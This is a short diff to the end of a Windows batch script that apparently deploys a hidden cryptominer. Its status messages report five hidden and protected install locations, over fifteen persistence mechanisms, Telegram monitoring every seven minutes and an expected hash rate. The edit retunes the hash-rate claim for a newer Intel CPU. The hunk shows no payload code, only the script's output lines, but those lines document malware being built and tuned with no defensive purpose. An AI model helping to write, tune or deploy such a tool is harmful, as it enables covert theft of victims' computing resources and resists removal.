@@ -211,7 +211,7 @@ echo [SUCCESS] V6 Ultimate deployment completed
 echo [INFO] Deployed to 5 locations with cross-monitoring
 echo [INFO] 15+ persistence mechanisms active
 echo [INFO] Telegram monitoring every 7 minutes
-echo [INFO] Optimized for i5 2.5GHz - Expected: 2800-3200 H/s
+echo [INFO] Optimized for i5-14400 - Expected: 5000-7000 H/s
 echo [INFO] All locations hidden and protected
 timeout /t 5 /nobreak >nul
 exit /b
